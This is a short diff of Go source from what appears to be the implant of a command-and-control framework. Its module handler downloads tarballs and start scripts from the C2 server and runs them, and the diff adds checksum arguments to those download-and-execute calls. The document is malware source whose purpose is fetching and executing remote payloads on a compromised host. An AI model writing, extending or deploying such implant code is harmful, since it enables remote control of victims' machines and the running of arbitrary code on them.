@@ -12,7 +12,7 @@ import (
 )
 
 // moduleHandler downloads and runs modules from C2
-func moduleHandler(modName, checksum string, inMem bool) (out string) {
+func moduleHandler(modName, checksum, startscript_checksum string, inMem bool) (out string) {
 	tarball := filepath.Join(RuntimeConfig.AgentRoot, modName+".tar.xz")
 	modDir := filepath.Join(RuntimeConfig.AgentRoot, modName)
 	startScript := fmt.Sprintf("%s.%s", modName, getScriptExtension())
@@ -33,7 +33,7 @@ func moduleHandler(modName, checksum string, inMem bool) (out string) {
 		}
 	}
 
-	out, err = runStartScript(startScript, modDir)
+	out, err = runStartScript(startScript, modDir, startscript_checksum)
 	if err != nil {
 		return fmt.Sprintf("running start script: %v: %s", err, out)
 	}
@@ -49,7 +49,7 @@ func getScriptExtension() string {
 
 func downloadAndVerifyModule(tarball, checksum string) error {
 	if tun.SHA256SumFile(tarball) != checksum {
-		if _, err := SmartDownload(tarball, tarball); err != nil {
+		if _, err := SmartDownload(tarball, tarball, checksum); err != nil {
 			return err
 		}
 	}
@@ -93,13 +93,13 @@ func processModuleFiles(modDir string) error {
 	return nil
 }
 
-func runStartScript(startScript, modDir string) (string, error) {
+func runStartScript(startScript, modDir, checksum string) (string, error) {
 	// cd to module dir
 	defer os.Chdir(RuntimeConfig.AgentRoot)
 	os.Chdir(modDir)
 
 	// Download the script payload
-	payload, err := SmartDownload(startScript, "")
+	payload, err := SmartDownload(startScript, "", checksum)
 	if err != nil {
 		return "", fmt.Errorf("downloading %s: %w", startScript, err)
 	}
